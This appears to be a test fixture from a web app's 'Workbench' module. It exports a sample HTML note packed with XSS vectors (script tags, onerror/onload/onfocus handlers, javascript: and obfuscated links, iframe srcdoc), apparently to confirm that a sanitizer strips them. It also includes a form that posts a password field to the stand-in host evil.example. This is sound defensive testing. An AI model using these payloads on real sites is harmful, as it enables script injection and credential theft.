/**
 * The Workbench room's hostile fixture.
 *
 * The room's HTML modules are real static files now: /workbench/components/*.html under the Vite public dir
 * (`public/workbench/components/`), fetched over HTTP by html-modules' own loader, as the standalone app does.
 */

/** The hostile note the "paste an XSS payload" preset submits. Nothing in it is ever executed by the room. */
export const XSS_TITLE = 'Pasted from a "helpful" web page';
export const XSS_PAYLOAD = `<h3>Q3 planning notes</h3>
<p>Looks harmless: <strong>bold</strong>, <em>italic</em> and <a href="https://opensource.johnhenry.me/safe-fragment/">a real link</a>.</p>
<img src="x" onerror="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('img onerror')">
<script>window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('script')</script>
<p><a href="javascript:window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('javascript: href')">click for the quarterly numbers</a>
   and <a href="  JaVa&#x09;ScRiPt:alert(1)">an obfuscated one</a></p>
<svg onload="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('svg onload')" width="10" height="10"><circle r="4"/></svg>
<iframe srcdoc="<script>parent.__orreryWorkbenchPwned = (parent.__orreryWorkbenchPwned || []).concat('iframe srcdoc')</script>"></iframe>
<form action="https://evil.example/steal"><input name="pw" autofocus onfocus="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('onfocus')"><button formaction="https://evil.example/steal">Send</button></form>
<p style="position:fixed;inset:0;background:red" onclick="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('onclick')">A full-page overlay, if style survived.</p>`;
